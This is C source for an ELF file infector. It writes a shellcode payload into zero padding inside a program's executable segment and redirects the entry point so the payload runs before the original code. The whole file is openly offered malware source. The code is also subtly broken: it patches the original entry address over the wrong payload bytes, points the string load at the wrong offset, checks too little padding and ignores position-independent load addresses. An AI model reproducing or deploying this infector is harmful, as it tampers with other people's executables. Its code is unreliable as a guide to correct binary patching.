#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/mman.h>
#include <elf.h>
#include <string.h>
#include <sys/stat.h>

unsigned char payload[] = {
    0x48,0x31,0xc0,                   // xor rax,rax
    0x48,0xc7,0xc0,1,0,0,0,           // mov rax,1
    0x48,0xc7,0xc7,1,0,0,0,           // mov rdi,1
    0x48,0x8d,0x35,0xd,0,0,0,         // lea rsi,[rip+0xd]
    0x48,0xc7,0xc2,9,0,0,0,           // mov rdx,9
    0x0f,0x05,                        // syscall
    0x48,0xb8,0,0,0,0,0,0,0,0,        // mov rax,<orig_entry>
    0xff,0xe0,                        // jmp rax
    'I','n','f','e','c','t','e','d','!','\n'
};

void fatal(const char *msg){perror(msg);exit(1);}

int main(int argc, char **argv){
    if(argc!=2){fprintf(stderr,"Usage: %s <elf>\n",argv[0]);exit(1);}

    int fd=open(argv[1],O_RDWR);
    if(fd<0)fatal("open");

    struct stat st;
    if(fstat(fd,&st)<0)fatal("fstat");

    unsigned char *map=mmap(NULL,st.st_size,PROT_READ|PROT_WRITE,MAP_SHARED,fd,0);
    if(map==MAP_FAILED)fatal("mmap");

    Elf64_Ehdr *eh=(Elf64_Ehdr*)map;
    Elf64_Phdr *ph=(Elf64_Phdr*)(map+eh->e_phoff);

    Elf64_Phdr *text=NULL;
    for(int i=0;i<eh->e_phnum;i++)
        if(ph[i].p_type==PT_LOAD && (ph[i].p_flags & PF_X))
            text=&ph[i];

    if(!text)fatal("no executable segment found");

    // Find padding within .text segment
    size_t inject_offset=0;
    for(size_t i=text->p_offset;i<(text->p_offset+text->p_filesz-sizeof(payload));i++){
        if(memcmp(map+i,"\0\0\0\0\0\0\0\0",8)==0){
            inject_offset=i;
            break;
        }
    }
    if(!inject_offset)fatal("no suitable padding found");

    Elf64_Addr inject_vaddr=text->p_vaddr+(inject_offset-text->p_offset);
    memcpy(&payload[33],&eh->e_entry,sizeof(eh->e_entry));
    memcpy(map+inject_offset,payload,sizeof(payload));
    eh->e_entry=inject_vaddr;

    msync(map,st.st_size,MS_SYNC);
    munmap(map,st.st_size);
    close(fd);

    printf("[+] Injected at offset 0x%lx (vaddr 0x%lx)\n",inject_offset,inject_vaddr);
    return 0;
}
